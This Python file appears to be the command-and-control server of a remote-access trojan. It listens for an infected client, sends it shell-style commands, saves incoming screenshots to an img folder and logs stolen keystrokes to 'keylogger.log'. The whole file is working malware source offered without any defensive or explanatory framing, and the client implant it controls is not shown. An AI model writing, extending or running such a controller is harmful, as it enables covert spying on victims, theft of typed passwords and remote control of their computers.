import socket
from threading import Thread
import sys
import os

HOST = "0.0.0.0"
PORT = 5001
os.makedirs("img", exist_ok=True)
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen()
try:
    print("Waiting for connection...")
    conn, addr = server.accept()
except KeyboardInterrupt:
    exit()
print("Connected:", addr)
def send():
    while True:
        try:
            print("\nSend command: ", end="", flush=True)
            cmd = sys.stdin.readline().strip()
            conn.sendall(b"cmd " + cmd.encode())
        except KeyboardInterrupt:
            exit()
        except:
            print("Connection lost")
            conn, addr = server.accept()
import struct

def recv_exact(sock, size):
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def check():
    while True:
        try:
            prefix = conn.recv(4)  # read "img,"

            if not prefix:
                # print("Client disconnected")
                # break
                continue

            if prefix == b"img,":
                # Read 4-byte size
                size_data = recv_exact(conn, 4)
                if not size_data:
                    break

                size = struct.unpack("!I", size_data)[0]
                # print(f"Receiving image ({size} bytes)")

                # Read image data
                image_data = recv_exact(conn, size)
                if not image_data:
                    break
                import os
                num = 0
                file = f"img/received_{num}.jpg"
                while True:
                    if os.path.exists(file):
                        num +=1
                        file = f"img/received_{num}.jpg"
                    else:
                        break
                with open(f"img/received_{num}.jpg", "wb") as f:
                    f.write(image_data)

                # print("Image saved as received.jpg")
            elif prefix == b'key,':
                data = conn.recv(4096)

                try:
                    text = data.decode("utf-8", errors="ignore")
                    key_data = text
                    print(key_data)
                    with open("keylogger.log", "a", encoding="utf-8") as file:
                        file.write(key_data + "\n")

                except Exception as e:
                    print("Error processing key:", e)
            else:
                # Handle normal text
                rest = conn.recv(4096)
                full_msg = prefix + rest
                print("Client replied:", full_msg.decode(errors="ignore"))

        except Exception as e:
            print("Error:", e)
            break
try:
    Thread(target=check, daemon=True).start()
    send()
except KeyboardInterrupt:
    exit()
except:
    try:
        print("Waiting for connection...")
        conn, addr = server.accept()
    except KeyboardInterrupt:
        exit()